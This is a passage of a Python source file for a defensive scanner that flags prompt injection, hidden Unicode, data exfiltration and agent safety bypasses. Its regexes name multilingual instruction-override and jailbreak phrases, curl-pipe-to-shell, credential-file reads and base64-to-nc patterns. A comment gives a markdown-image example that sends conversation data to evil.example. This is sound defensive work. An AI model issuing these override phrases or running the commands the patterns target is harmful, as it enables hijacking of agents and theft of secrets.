"""
PRAETOR AI-security / agent-supply-chain engine (pure standard library).

This is PRAETOR's differentiator. It targets the attack surface a self-improving
agent or an LLM-in-the-loop pipeline actually faces -- threats that classic SAST
and secret scanners do not model:

  A. PROMPT INJECTION      instruction-override phrasing, role/authority hijacks,
                           agent-directed imperatives hidden in docs/data.
  B. HIDDEN CONTENT        zero-width / invisible Unicode, Unicode-Tags ASCII
                           smuggling (U+E0000..E007F), bidirectional "Trojan
                           Source" controls, instruction-bearing HTML comments.
  C. DATA EXFILTRATION     curl|sh install pipes, reads of ~/.aws /~/.ssh/.env,
                           env dumps POSTed to external hosts, base64|curl.
  D. DANGEROUS HOOKS       auto-run agent hooks -- Claude Code
                           (SessionStart/PostToolUse/...), Cursor
                           (beforeShellExecution/afterFileEdit/...), Windsurf,
                           Cline/Roo -- plus git hooks and npm/pip lifecycle
                           scripts that execute on load or install.
  E. SAFETY BYPASS         instructions telling an agent to disable safety,
                           auto-approve, skip review, or escalate privileges.
  F. ENCODED PAYLOAD       base64/hex/URL-encoded instruction-override or
                           exfiltration payloads that plaintext matching alone
                           misses -- decoded one level and rescanned against
                           A and C's own rule tables.

Mapped to the OWASP Top 10 for LLM Applications and to CWE where applicable.
"""

from __future__ import annotations

import base64
import binascii
import json
import os
import re
import unicodedata
import urllib.parse

from core import Finding, Severity, Confidence, split_lines, GIT_HOOK_NAMES

REF_LLM = "https://owasp.org/www-project-top-10-for-large-language-model-applications/"
REF_TROJAN = "https://trojansource.codes/"

# --------------------------------------------------------------------------- #
# B. Hidden / invisible Unicode
# --------------------------------------------------------------------------- #

# zero-width & invisible formatting characters
INVISIBLE = {
    0x200B: "ZERO WIDTH SPACE", 0x200C: "ZERO WIDTH NON-JOINER",
    0x200D: "ZERO WIDTH JOINER", 0x2060: "WORD JOINER",
    0xFEFF: "ZERO WIDTH NO-BREAK SPACE / BOM", 0x00AD: "SOFT HYPHEN",
    0x180E: "MONGOLIAN VOWEL SEPARATOR", 0x2061: "FUNCTION APPLICATION",
    0x2062: "INVISIBLE TIMES", 0x2063: "INVISIBLE SEPARATOR",
    0x2064: "INVISIBLE PLUS", 0x206A: "INHIBIT SYMMETRIC SWAPPING",
    0x206B: "ACTIVATE SYMMETRIC SWAPPING", 0x206C: "INHIBIT ARABIC FORM SHAPING",
    0x206E: "NATIONAL DIGIT SHAPES", 0x206F: "NOMINAL DIGIT SHAPES",
}

# bidirectional controls used by Trojan Source attacks (CVE-2021-42574)
BIDI = {
    0x202A: "LEFT-TO-RIGHT EMBEDDING", 0x202B: "RIGHT-TO-LEFT EMBEDDING",
    0x202C: "POP DIRECTIONAL FORMATTING", 0x202D: "LEFT-TO-RIGHT OVERRIDE",
    0x202E: "RIGHT-TO-LEFT OVERRIDE", 0x2066: "LEFT-TO-RIGHT ISOLATE",
    0x2067: "RIGHT-TO-LEFT ISOLATE", 0x2068: "FIRST STRONG ISOLATE",
    0x2069: "POP DIRECTIONAL ISOLATE",
}


def _tag_char(cp: int) -> bool:
    # Unicode Tags block: invisible, can smuggle a full ASCII payload past a human.
    return 0xE0000 <= cp <= 0xE007F


#: ESC (0x1B) followed by '[' -- the CSI (Control Sequence Introducer) that opens
#: every ANSI cursor-movement, color, and (via OSC 8, ESC ']') hyperlink escape.
#: 🔴 Added 2026-09-02 per references/audits/2026-09-02-aisec-competitor-survey.md
#: (garak's probes.ansiescape): a raw escape sequence in a file that gets printed
#: to a terminal -- a log line, a tool's own output template, an agent's response
#: rendered raw -- can move the cursor, overwrite what a reviewer sees, or forge a
#: clickable hyperlink to a malicious URL. Same threat shape as the Unicode
#: HIDDEN_CONTENT detectors above: content that reads one way to the byte stream
#: and another way once rendered. Scoped to the RAW byte (0x1B), not its escaped
#: textual spelling ("\\x1b", "\\033") in source, which is a much noisier signal
#: (present in any terminal-color library) and not attempted here.
_ESC = "\x1b"


def _scan_unicode(text: str, rel: str) -> list:
    out: list = []
    line_no = 1
    inv_hits, bidi_hits, tag_hits = {}, {}, 0
    ansi_hits = {}
    tag_first_line = None
    prev_ch = ""
    for ch in text:
        cp = ord(ch)
        if ch == "\n":
            line_no += 1
            prev_ch = ch
            continue
        if _tag_char(cp):
            tag_hits += 1
            if tag_first_line is None:
                tag_first_line = line_no
        elif cp in BIDI:
            bidi_hits.setdefault(line_no, BIDI[cp])
        elif cp in INVISIBLE:
            inv_hits.setdefault(line_no, INVISIBLE[cp])
        elif ch == "[" and prev_ch == _ESC:
            ansi_hits.setdefault(line_no, 0)
            ansi_hits[line_no] += 1
        prev_ch = ch

    if tag_hits:
        out.append(Finding(
            engine="aisec", rule_id="unicode-tag-smuggling",
            title="Invisible Unicode Tag characters (ASCII smuggling)",
            severity=Severity.CRITICAL, confidence=Confidence.HIGH,
            file=rel, line=tag_first_line or 1, category="HIDDEN_CONTENT",
            description=(f"{tag_hits} Unicode Tag code point(s) (U+E0000-E007F) found. These are "
                        "invisible to humans and are a known channel for smuggling hidden "
                        "instructions into an LLM's context."),
            snippet=f"{tag_hits} invisible tag character(s)",
            fix="Strip Tag-block characters from all model-facing text; treat their presence as hostile.",
            cwe="CWE-1007", owasp="LLM01: Prompt Injection", references=[REF_LLM],
        ))
    for ln, count in list(ansi_hits.items())[:20]:
        out.append(Finding(
            engine="aisec", rule_id="ansi-escape-sequence",
            title="Raw ANSI/CSI terminal escape sequence",
            severity=Severity.MEDIUM, confidence=Confidence.MEDIUM,
            file=rel, line=ln, category="HIDDEN_CONTENT",
            description=(f"{count} raw ESC+'[' (CSI) sequence(s) found. A terminal escape sequence "
                        "in text that gets printed raw -- a log line, a tool's output template, an "
                        "agent's rendered response -- can move the cursor, overwrite what a reviewer "
                        "sees on screen, or (via OSC 8) forge a clickable hyperlink to a malicious "
                        "URL while the visible label stays innocuous."),
            snippet=f"{count} raw ANSI escape sequence(s)",
            fix="Strip or escape raw ESC bytes before the content is rendered in a terminal.",
            cwe="CWE-150", owasp="LLM01: Prompt Injection", references=[REF_LLM],
        ))
    for ln, name in list(bidi_hits.items())[:20]:
        out.append(Finding(
            engine="aisec", rule_id="bidi-control-trojan-source",
            title="Bidirectional control character (Trojan Source)",
            severity=Severity.HIGH, confidence=Confidence.HIGH,
            file=rel, line=ln, category="HIDDEN_CONTENT",
            description=(f"Bidi control '{name}' can make source/text render differently than it "
                        "is parsed, hiding logic from a human reviewer (CVE-2021-42574)."),
            snippet=f"contains {name}",
            fix="Remove bidirectional overrides/isolates from source and model-facing text.",
            cwe="CWE-1007", owasp="LLM01: Prompt Injection",
            references=[REF_TROJAN, "https://cwe.mitre.org/data/definitions/1007.html"],
        ))
    for ln, name in list(inv_hits.items())[:20]:
        out.append(Finding(
            engine="aisec", rule_id="invisible-unicode",
            title="Invisible / zero-width Unicode character",
            severity=Severity.MEDIUM, confidence=Confidence.MEDIUM,
            file=rel, line=ln, category="HIDDEN_CONTENT",
            description=(f"Zero-width/invisible character '{name}' can hide text from human "
                        "reviewers while remaining in the model's input."),
            snippet=f"contains {name}",
            fix="Normalize and strip zero-width characters from model-facing content.",
            cwe="CWE-1007", owasp="LLM01: Prompt Injection", references=[REF_LLM],
        ))
    return out


# --------------------------------------------------------------------------- #
# B (cont). Homoglyphs / confusables -- MIXED SCRIPT WITHIN ONE TOKEN
# --------------------------------------------------------------------------- #
# The sibling detectors above catch characters that are INVISIBLE. This one
# catches characters that are VISIBLE and look like something they are not:
# Cyrillic U+0430 renders identically to Latin "a", so "p<U+0430>ypal" and "paypal"
# are indistinguishable to a human reviewer and different strings to every machine.
#
# 📌 Note the notation. This comment SPELLS OUT the code point instead of pasting
# the character, and that is not fussiness: an earlier draft pasted it, and this
# detector then flagged its own explanation -- correctly. A literal lookalike in
# prose about lookalikes is unreviewable by construction.
#
# 🔴 THE SCOPE DECISION IS THE WHOLE DETECTOR, and getting it wrong in the
# obvious direction would make this unusable:
#
#   FIRE on   a token that mixes Latin WITH a confusable script  -- "p<U+0430>ypal"
#   NEVER on  a token written wholly in another script           -- `Привет`
#
# A Russian README is not an attack. "Contains non-ASCII" would flag every
# non-English document in the world, and a detector that cries wolf on ordinary
# prose gets disabled, which is a worse outcome than not shipping it. The attack
# signature is the MIXTURE inside a single word -- nobody writes one word half in
# Latin and half in Cyrillic by accident.
#
# ⚠️ This is necessarily incomplete: a wholly-Cyrillic string that mimics a Latin
# one (`расс` for `pacc`) has no mixture to detect and is NOT caught here. Stated
# rather than implied -- absence of this finding is not evidence of authenticity.

# Scripts with characters visually confusable with Latin. Deliberately short:
# every entry here is a script whose lookalikes are used in real attacks.
_CONFUSABLE_SCRIPTS = frozenset({"CYRILLIC", "GREEK", "ARMENIAN", "CHEROKEE"})

# Unicode letters only -- \W with re.UNICODE excludes digits and underscore.
_WORD_RE = re.compile(r"[^\W\d_]+", re.UNICODE)


def _script_of(ch: str) -> str:
    """Derive a character's script from its Unicode name prefix.

    Uses `unicodedata` rather than a bundled confusables table so this stays
    stdlib-only, which the whole aisec engine depends on.
    """
    if ch.isascii():
        return "LATIN"
    try:
        return unicodedata.name(ch).split(" ", 1)[0]
    except ValueError:      # unnamed / private-use code point
        return "UNKNOWN"


def _scan_homoglyphs(text: str, rel: str) -> list:
    out: list = []
    skipped = 0
    # split_lines, not str.splitlines: `_scan_unicode` counts \n, and two
    # detectors in one engine must not disagree about what a line is.
    for ln, line in enumerate(split_lines(text), start=1):
        # Fast path AND a correctness statement: a mixed-script token requires at
        # least one non-ASCII character, so an all-ASCII line cannot contain one.
        if len(line) > 6000:
            skipped += 1
            continue
        if line.isascii():
            continue
        for tok in _WORD_RE.findall(line):
            if tok.isascii():
                continue
            scripts = {_script_of(c) for c in tok}
            if "LATIN" not in scripts:
                continue            # wholly non-Latin: ordinary foreign text
            confusable = sorted(scripts & _CONFUSABLE_SCRIPTS)
            if not confusable:
                continue            # e.g. Latin + accents, or Latin + CJK: not a lookalike
            # Name the offending code points explicitly -- the whole problem is
            # that a reviewer CANNOT see them by looking.
            odd = ", ".join(
                f"U+{ord(c):04X} {unicodedata.name(c, '?')}"
                for c in dict.fromkeys(c for c in tok if _script_of(c) in _CONFUSABLE_SCRIPTS)
            )
            out.append(Finding(
                engine="aisec", rule_id="homoglyph-mixed-script",
                title="Mixed-script token (homoglyph / confusable characters)",
                severity=Severity.HIGH, confidence=Confidence.MEDIUM,
                file=rel, line=ln, category="HIDDEN_CONTENT",
                description=(
                    f"The token '{tok}' mixes Latin with {', '.join(confusable)} characters that "
                    "render identically to Latin letters. A human reviewer cannot distinguish it "
                    "from the legitimate spelling, while every string comparison, allowlist and "
                    "URL resolver treats it as a different value. Offending code point(s): "
                    + odd + "."
                ),
                snippet=f"{tok}  [{odd}]",
                fix=("Normalise model-facing and security-relevant text to a single script; reject "
                     "mixed-script identifiers, domains and package names outright."),
                cwe="CWE-1007", owasp="LLM01: Prompt Injection",
                references=[REF_LLM, "https://www.unicode.org/reports/tr39/"],
            ))
            if len(out) >= 20:
                break
    if skipped:
        out.append(Finding(
            engine="aisec", rule_id="aisec-long-line-skip",
            title="AI-security coverage limited by long line",
            severity=Severity.INFO, confidence=Confidence.HIGH,
            file=rel, line=1, category="COVERAGE",
            description=f"{skipped} line(s) exceeded the 6000-character analysis cap and were skipped by homoglyph scanning.",
            snippet=f"skipped_lines={skipped}; cap=6000",
            fix="Split oversized lines before scanning to restore full AI-security coverage.",
            references=[REF_LLM],
        ))
    return out


# --------------------------------------------------------------------------- #
# A. Prompt injection  /  E. Safety bypass   (regex, per line)
# --------------------------------------------------------------------------- #
# (rule_id, title, regex, severity, confidence, category, cwe, owasp, fix)

INJECTION = [
    ("prompt-injection-override", "Instruction-override phrasing",
     re.compile(r"(?i)\b(ignore|disregard|forget)\b[^.\n]{0,40}\b(all\s+)?(previous|prior|above|earlier|the\s+system|your)\b[^.\n]{0,20}\b(instruction|prompt|rule|direction|context)"),
     Severity.HIGH, Confidence.MEDIUM, "PROMPT_INJECTION", "CWE-77", "LLM01: Prompt Injection",
     "Treat this text as untrusted data, not instructions; do not let file content steer the agent."),

    # 🔴 Added 2026-09-04 per references/ROADMAP-V1.md §3 ("every INJECTION rule
    # is English-only today; PINT's own benchmark holds ~30% of its corpus in 24
    # other languages specifically to catch this failure mode"). Researched, not
    # translated: every sub-pattern below is grounded in a real quoted example
    # from an independent source (a security article, a practitioner's own
    # detection regex, or a language Wikipedia's own worked example) -- not a
    # machine translation of the English phrase guessed word-for-word. Confidence
    # varies by language and is stated below; where no independently-sourced real
    # example turned up (Hindi), the language was left out rather than guessed --
    # that gap is disclosed, not silently absent.
    #
    # A SEPARATE rule from prompt-injection-override above, not the same regex
    # widened, for two reasons. (1) Blast-radius isolation: that rule is
    # established and tested; a bad multilingual sub-pattern should be fixable
    # without touching it. (2) CJK mechanics are not just "a different alphabet"
    # -- Chinese/Japanese/Korean have no spaces, so `\b` (a transition between a
    # `\w` char and a non-`\w` char) never fires *inside* a run of CJK text: two
    # adjacent Han/Hangul characters are both `\w` under Python's Unicode-aware
    # `re`, so a `\b`-anchored port of the English pattern would silently never
    # match real CJK injection text. Those sub-patterns rely on plain adjacency
    # instead, letting the multi-character compound phrase itself -- not a
    # boundary assertion -- carry the specificity; verified against ordinary
    # non-attack prose in the same languages (see the test file).
    #
    # Word order differs by language and was checked against each source
    # example, not templated from English: Spanish/French/Portuguese/Arabic put
    # the "previous" adjective AFTER the instruction noun ("instrucciones
    # anteriores" = lit. "instructions previous"); German/Russian/Chinese put it
    # BEFORE, like English; Japanese/Korean are SOV, so the ignore-verb comes
    # AFTER the instruction word (plus object particle), not before it ("上記の
    # 指示を無視" = lit. "above's instructions [obj] ignore").
    #
    # Confidence per language:
    #   HIGH   -- Spanish, French, German, Portuguese: real quoted attack
    #             examples from independent security-research articles.
    #             Russian: a practitioner's own live injection-detection regex
    #             (published on Habr) literally lists "игнорируй" and "забудь
    #             инструкции" as the patterns it screens for. Arabic: a real
    #             quoted attack example from an Al Jazeera-affiliated tech
    #             article. Chinese (Simplified): zh.wikipedia.org's own worked
    #             example sentence for the prompt-injection article.
    #   MEDIUM -- Japanese: ja.wikipedia.org's own worked example sentence, but
    #             the SOV reordering above is this session's own grammatical
    #             construction from that one example, not itself independently
    #             cross-checked. Korean: a real quoted news headline used the
    #             core phrase, same SOV-reordering caveat as Japanese.
    #   NOT ADDED -- Hindi: every search surfaced only this session's own
    #             candidate translation echoed back, never an independently
    #             authored real example. Guessing it would be exactly the
    #             unverified-translation failure mode this rule exists to fix.
    #
    # Every sub-pattern requires BOTH an ignore-family verb AND a previous/above
    # qualifier next to the instruction word -- same design as the English rule
    # above, deliberately not a bare "ignore" match, which would fire
    # constantly on ordinary non-English prose (technical docs routinely say
    # "see the instructions above" in every one of these languages). Mutation-
    # tested in both directions; see tests/test_multilingual_injection_override.py.
    ("prompt-injection-override-multilingual", "Instruction-override phrasing (non-English)",
     re.compile(
         "(?i)"
         r"\b(?:ignora|ignore|ignoren|olvida|olvide|olviden)\b[^.\n]{0,40}\b(?:instrucciones|instrucción|reglas)\b[^.\n]{0,20}\b(?:anteriores?|previas?)\b"  # es
         r"|\b(?:ignore|ignorez|ignorer|oublie|oubliez|oublier)\b[^.\n]{0,40}\b(?:instructions?|règles?)\b[^.\n]{0,20}\b(?:précédentes?|antérieures?)\b"  # fr
         r"|\b(?:ignoriere|ignorieren|vergiss|vergessen)\b[^.\n]{0,40}\b(?:vorherigen|obigen)\b[^.\n]{0,20}\b(?:anweisungen|anweisung|regeln)\b"  # de
         r"|\b(?:ignore|ignorem|desconsidere|desconsiderem)\b[^.\n]{0,40}\b(?:instruções|instrução|regras)\b[^.\n]{0,20}\b(?:anteriores?)\b"  # pt
         r"|\b(?:игнорируй|игнорируйте|забудь|забудьте)\b[^.\n]{0,40}\b(?:предыдущие|предыдущих|предыдущую)\b[^.\n]{0,20}\b(?:инструкции|инструкцию|указания)\b"  # ru
         r"|\bتجاهل\b[^.\n]{0,40}\b(?:كل\s+)?(?:التعليمات|الأوامر)\b[^.\n]{0,20}\b(?:السابقة|السابق)\b"  # ar
         r"|(?:忽略|无视)[^。\n]{0,10}(?:之前|以前|上述|以上)[^。\n]{0,6}(?:指令|指示|规则)"  # zh (no \b -- see comment above)
         r"|(?:上記|以前|前述)の(?:指示|指令|命令)を[^。\n]{0,6}(?:無視|忘れ)"  # ja (no \b -- see comment above)
         r"|(?:이전|위)\s*(?:지시|지침|명령)\s*(?:를|을)?\s*무시"  # ko
     ),
     Severity.HIGH, Confidence.MEDIUM, "PROMPT_INJECTION", "CWE-77", "LLM01: Prompt Injection",
     "Treat this text as untrusted data, not instructions; do not let file content steer the agent."),

    ("prompt-injection-new-instructions", "Injected 'new instructions' block",
     re.compile(r"(?i)\b(new|updated|revised|real|actual)\s+(instruction|system\s+prompt|directive|task)s?\s*[:\-]"),
     Severity.MEDIUM, Confidence.LOW, "PROMPT_INJECTION", "CWE-77", "LLM01: Prompt Injection",
     "Do not follow instructions embedded in scanned/tool-returned content."),

    # 🔴 Added 2026-09-03 per references/audits/2026-09-02-aisec-competitor-survey.md
    # (garak's detectors.dan): the original pattern caught the core PHRASING of a
    # role hijack but not a full known jailbreak TEMPLATE pasted verbatim -- garak
    # maintains a catalog of ~19 named DAN-family variants, each with its own
    # literal output marker a successful jailbreak persona is expected to echo.
    # Coverage-widening, not gap-closing: a template using generic phrasing was
    # already caught above; this adds the two markers distinctive enough to be
    # low-risk. ⚠️ Bare "STAN:"/"DUDE:"/"DAN:" speaker-label markers were
    # DELIBERATELY NOT added: Stan and Dan are common first names and "dude:" is
    # an ordinary chat opener, so a line-start match on any of them would fire on
    # an ordinary meeting transcript or chat log -- exactly the "cries wolf on
    # ordinary prose" failure this file's own homoglyph detector comment warns
    # against. The two markers actually kept -- a bracketed all-caps jailbreak
    # tag, and the 🔓-flag "Developer Mode" persona-announcement phrase below --
    # carry no such ordinary meaning.
    ("prompt-injection-role-hijack", "Role/authority hijack",
     re.compile(r"(?i)\b(you\s+are\s+now|from\s+now\s+on\s+you|act\s+as\s+(an?\s+)?(unrestricted|jailbroken|dan|developer\s+mode)|do\s+anything\s+now|pretend\s+you\s+have\s+no\s+(rules|restrictions))\b"
                r"|\bDeveloper\s+Mode\s+(Output|Enabled|Response)\b"
                r"|\[\s*JAILBREAK\s*\]"),
     Severity.HIGH, Confidence.MEDIUM, "PROMPT_INJECTION", "CWE-77", "LLM01: Prompt Injection",
     "Reject role-reassignment attempts originating from data/content."),

    ("prompt-injection-system-role", "Fake system/assistant role marker in data",
     re.compile(r"(?im)^\s*(?:<\|?(system|assistant)\|?>|\[/?(system|inst)\]|###\s*system\s*:|system\s+prompt\s*:)"),
     Severity.MEDIUM, Confidence.LOW, "PROMPT_INJECTION", "CWE-77", "LLM01: Prompt Injection",
     "Strip chat-role delimiters from untrusted content before it reaches a model."),

    ("agent-directed-imperative", "Agent-directed imperative in content",
     re.compile(r"(?i)\b(assistant|claude|chatgpt|gpt|copilot|the\s+ai|the\s+agent|the\s+model)\s*,?\s+(please\s+)?(run|execute|curl|wget|send|email|forward|delete|exfiltrate|post|upload|fetch|disable|ignore)\b"),
     Severity.HIGH, Confidence.MEDIUM, "PROMPT_INJECTION", "CWE-77", "LLM01: Prompt Injection",
     "Content that addresses the agent by name and issues commands is a hostile-injection signal."),

    ("safety-bypass-instruction", "Instruction to disable safety / auto-approve",
     re.compile(r"(?i)\b(auto[\-\s]?approve|disable\s+(the\s+)?(safety|guard|guardrail|confirmation|sandbox|protection)|bypass\s+(the\s+)?(gate|approval|permission|review|check)|skip\s+(the\s+)?(review|audit|confirmation|approval|permission)|without\s+(asking|confirmation|approval|human)|no\s+confirmation\s+needed)\b"),
     Severity.HIGH, Confidence.MEDIUM, "SAFETY_BYPASS", "CWE-807", "LLM01: Prompt Injection",
     "An agent instruction that removes human approval or safety checks; require review before honoring it."),

    ("dangerous-permission-flag", "Dangerous agent/CLI permission flag",
     re.compile(r"(?i)(--dangerously-skip-permissions|--yes-really|--no-verify\b|--disable-sandbox|--allow-all|acceptAll|autoApprove\s*[:=]\s*true)"),
     Severity.HIGH, Confidence.MEDIUM, "SAFETY_BYPASS", "CWE-250", "LLM01: Prompt Injection",
     "Flags that skip permission prompts or verification should never be baked into shared config."),

    ("privilege-escalation", "Privilege escalation / world-writable",
     re.compile(r"(?i)\b(sudo\s+\S|chmod\s+777|chmod\s+-R\s+777|run\s+as\s+root|setuid)\b"),
     Severity.MEDIUM, Confidence.LOW, "SAFETY_BYPASS", "CWE-250", "LLM01: Prompt Injection",
     "Avoid privilege escalation and world-writable permissions in automation."),
]

# --------------------------------------------------------------------------- #
# C. Data exfiltration
# --------------------------------------------------------------------------- #

EXFIL = [
    ("remote-code-pipe", "Remote code execution via curl|sh",
     re.compile(r"(?i)\b(curl|wget)\b[^\n|]{0,200}\|\s*(sudo\s+)?(sh|bash|zsh|python[0-9.]*|node|pwsh|powershell)\b"),
     Severity.HIGH, Confidence.HIGH, "EXFIL", "CWE-494", "LLM05: Supply Chain",
     "Never pipe a remote script straight into a shell; download, review, pin a checksum, then run."),

    ("powershell-download-exec", "PowerShell download-and-execute",
     re.compile(r"(?i)(Invoke-Expression|iex)\b[^\n]{0,80}(Invoke-WebRequest|iwr|DownloadString|Net\.WebClient)"),
     Severity.HIGH, Confidence.HIGH, "EXFIL", "CWE-494", "LLM05: Supply Chain",
     "Do not execute downloaded content; fetch, inspect, and verify before running."),

    ("sensitive-file-read", "Read of sensitive credential path",
     re.compile(r"(?i)(~|\$HOME|%USERPROFILE%)?[/\\]?\.(aws/credentials|ssh/id_[a-z0-9]+|ssh/id_rsa|netrc|npmrc|docker/config\.json|kube/config|config/gcloud|gnupg)\b|\bid_rsa\b"),
     Severity.MEDIUM, Confidence.LOW, "EXFIL", "CWE-200", "LLM06: Sensitive Information Disclosure",
     "Confirm why credential files are accessed; agents/scripts should not read ~/.aws, ~/.ssh, etc."),

    ("env-exfil", "Environment dump sent to network",
     re.compile(r"(?i)\b(printenv|env\b|os\.environ|process\.env|Get-ChildItem\s+env:)[^\n]{0,120}\b(curl|wget|fetch|requests\.(post|get)|Invoke-WebRequest|http\.client|axios|urllib)\b"),
     Severity.HIGH, Confidence.MEDIUM, "EXFIL", "CWE-200", "LLM06: Sensitive Information Disclosure",
     "Sending environment variables to a network endpoint is a classic secret-exfiltration pattern."),

    ("base64-exfil", "Base64-encoded data piped to network",
     re.compile(r"(?i)\bbase64\b[^\n|]{0,60}\|[^\n]{0,60}\b(curl|wget|nc|ncat)\b"),
     Severity.HIGH, Confidence.MEDIUM, "EXFIL", "CWE-200", "LLM06: Sensitive Information Disclosure",
     "Base64+network piping is often used to obfuscate exfiltrated data."),

    ("dns-exfil", "Possible DNS exfiltration",
     re.compile(r"(?i)\b(nslookup|dig|host)\b[^\n]{0,60}\$\(|\bcurl\b[^\n]{0,60}\.(?:oast|burpcollaborator|interact\.sh|requestbin)\b"),
     Severity.MEDIUM, Confidence.LOW, "EXFIL", "CWE-200", "LLM06: Sensitive Information Disclosure",
     "Dynamic hostname lookups can smuggle data out over DNS; verify the destination."),

    # 🔴 Added 2026-09-02 per references/audits/2026-09-02-aisec-competitor-survey.md
    # (garak's probes.web_injection): a zero-click exfiltration vector needing no
    # shell command at all. A markdown image tag renders by fetching its URL
    # automatically the moment the markdown is displayed -- an agent instructed to
    # emit `![x](https://evil.example/?d=<conversation data>)` in its own response,
    # or a file whose content an agent is told to render, exfiltrates the instant
    # it's shown, before any human reads it. Every EXFIL rule above this one is
    # shell/network-command shaped; none would catch this.
    ("markdown-image-exfil", "Markdown image/link with data-shaped query string",
     re.compile(r"!?\[[^\]\n]*\]\(\s*https?://[^\s)]+\?[^\s)]{0,300}(?:conversation|context|history|session|"
                r"transcript|secret|token|key|credential|data|dump)[^\s)]{0,200}\)", re.IGNORECASE),
     Severity.HIGH, Confidence.MEDIUM, "EXFIL", "CWE-200", "LLM06: Sensitive Information Disclosure",
     "A markdown image/link renders (and fetches its URL) automatically on display. Never embed "
     "conversation, session, or credential data in a URL an agent is instructed to render."),
]

# --------------------------------------------------------------------------- #
# F. Encoded payload (decode-then-rescan)
# --------------------------------------------------------------------------- #
#
# INJECTION and EXFIL above match plaintext only. An attacker who base64/hex/
# URL-encodes the same instruction defeats every rule in both tables with zero
# extra effort -- garak's probes.encoding module tests this exact evasion class.
#
# Deliberately bounded, on both axes, because an earlier engine in this repo
# hung ~244s on an unbounded pass over one file (see project memory: "the hang
# had no exit code"). Every cap here is disclosed via a COVERAGE finding when
# it's hit, never a silent truncation:
#   - decode depth is exactly 1 -- the decoded text is rescanned once, its
#     output is NEVER fed back in for a second decode pass. No recursion, so
#     there is no exponential-blowup or infinite-loop shape to hang on.
#   - a candidate blob must be 40-4000 chars (the upper bound is the same
#     order of magnitude as the existing 6000-char per-line cap below).
#   - at most 200 candidates and 200,000 decoded bytes are processed per file;
#     the rest are counted and disclosed, not silently dropped.
#
# ROT13 is a known, disclosed gap, not an oversight: unlike base64/hex/URL
# encoding, ROT13 output uses the same alphabet as ordinary prose, so there is
# no cheap way to pick out "candidate" substrings the way _B64_CANDIDATE etc.
# do below -- catching it would mean rot13-decoding and rescanning EVERY line
# of EVERY file, roughly doubling this engine's total regex cost estate-wide
# for a rarely-used real-world evasion. Revisit as its own scoped decision,
# not folded in here under a different design's cost budget.
_DECODE_CANDIDATE_MIN = 40
_DECODE_CANDIDATE_MAX = 4000
_DECODE_MAX_CANDIDATES_PER_FILE = 200
_DECODE_MAX_BYTES_PER_FILE = 200_000

_B64_CANDIDATE = re.compile(r"[A-Za-z0-9+/]{" + str(_DECODE_CANDIDATE_MIN) + "," + str(_DECODE_CANDIDATE_MAX) + r"}={0,2}")
_HEX_CANDIDATE = re.compile(r"(?:[0-9a-fA-F]{2}){" + str(_DECODE_CANDIDATE_MIN // 2) + "," + str(_DECODE_CANDIDATE_MAX // 2) + r"}")

# URL-encoding gets a different candidate shape than base64/hex: a realistic
# evasion percent-encodes only what it needs to (spaces, punctuation) to break
# a plaintext regex's \s+/word-boundary assumptions, leaving letters literal
# -- so "10+ %XX groups back to back" (what base64/hex use) almost never
# matches real quote()-style output. Count %XX occurrences anywhere in the
# line instead, and decode the whole line once past a minimum count.
_URLENC_GROUP = re.compile(r"%[0-9a-fA-F]{2}")
# 3, not a round higher number: quote()'s default only escapes spaces and a
# handful of punctuation characters, so a short realistic injection phrase
# (e.g. a 4-word imperative -- 3 spaces) already sits right at this floor.
# Ordinary code/config with an incidental %XX or two (a single encoded query
# param) stays below it.
_URLENC_MIN_GROUPS = 3


def _decode_base64(s: str):
    try:
        pad = (-len(s)) % 4
        raw = base64.b64decode(s + ("=" * pad), validate=True)
        return raw.decode("utf-8", errors="strict")
    except Exception:
        return None


def _decode_hex(s: str):
    try:
        raw = binascii.unhexlify(s)
        return raw.decode("utf-8", errors="strict")
    except Exception:
        return None


def _decode_urlenc(s: str):
    try:
        out = urllib.parse.unquote(s, errors="strict")
        return out if out != s else None  # unquote() never raises on a plain string; require it to have actually changed
    except Exception:
        return None


def _emit_decoded_findings(findings, rel, i, encoding_name, raw_form, decoded):
    for group in (INJECTION, EXFIL):
        for rule_id, title, rx, sev, conf, cat, cwe, owasp, fix in group:
            if rx.search(decoded):
                findings.append(Finding(
                    engine="aisec", rule_id=rule_id + "-decoded", title=title + f" (inside {encoding_name}-decoded content)",
                    severity=sev, confidence=conf, file=rel, line=i, category=cat,
                    description=title + f". Not visible in plaintext -- only appears after decoding a {encoding_name} blob on this line.",
                    snippet=(raw_form[:80] + " -> " + decoded.strip()[:120])[:200],
                    fix=fix, cwe=cwe, owasp=owasp, references=[REF_LLM],
                ))


def _scan_decoded(text: str, rel: str) -> list:
    """Decode-then-rescan: find candidate encoded blobs, decode exactly one
    level, and re-run INJECTION/EXFIL against the decoded text. Bounded on
    every axis above; see the module comment for why."""
    findings: list = []
    lines = split_lines(text)
    candidates = 0
    decoded_bytes = 0
    budget_exceeded = False
    seen = set()  # (line, start, end, encoding) -- encoding is part of the key so
                  # base64 and hex, which share most of their alphabet, don't block
                  # each other out on an identical span.

    for i, line in enumerate(lines, start=1):
        if len(line) > 6000:
            continue  # already disclosed by aisec-long-line-skip in scan()

        for pattern, decoder, encoding_name in (
            (_B64_CANDIDATE, _decode_base64, "base64"),
            (_HEX_CANDIDATE, _decode_hex, "hex"),
        ):
            for m in pattern.finditer(line):
                key = (i, m.start(), m.end(), encoding_name)
                if key in seen:
                    continue
                seen.add(key)

                if candidates >= _DECODE_MAX_CANDIDATES_PER_FILE or decoded_bytes >= _DECODE_MAX_BYTES_PER_FILE:
                    budget_exceeded = True
                    continue
                candidates += 1

                blob = m.group(0)
                decoded = decoder(blob)
                if not decoded:
                    continue
                decoded_bytes += len(decoded)
                _emit_decoded_findings(findings, rel, i, encoding_name, blob, decoded)

        # URL-encoding: whole-line, count-gated (see the constant's own comment
        # for why this can't be a contiguous-span candidate like base64/hex).
        if len(_URLENC_GROUP.findall(line)) >= _URLENC_MIN_GROUPS:
            key = (i, 0, len(line), "url-encoded")
            if key not in seen:
                seen.add(key)
                if candidates >= _DECODE_MAX_CANDIDATES_PER_FILE or decoded_bytes >= _DECODE_MAX_BYTES_PER_FILE:
                    budget_exceeded = True
                else:
                    candidates += 1
                    decoded = _decode_urlenc(line)
                    if decoded:
                        decoded_bytes += len(decoded)
                        _emit_decoded_findings(findings, rel, i, "url-encoded", line, decoded)

    if budget_exceeded:
        findings.append(Finding(
            engine="aisec", rule_id="aisec-decode-budget-exceeded",
            title="Decode-then-rescan coverage limited by per-file budget",
            severity=Severity.INFO, confidence=Confidence.HIGH,
            file=rel, line=1, category="COVERAGE",
            description=(
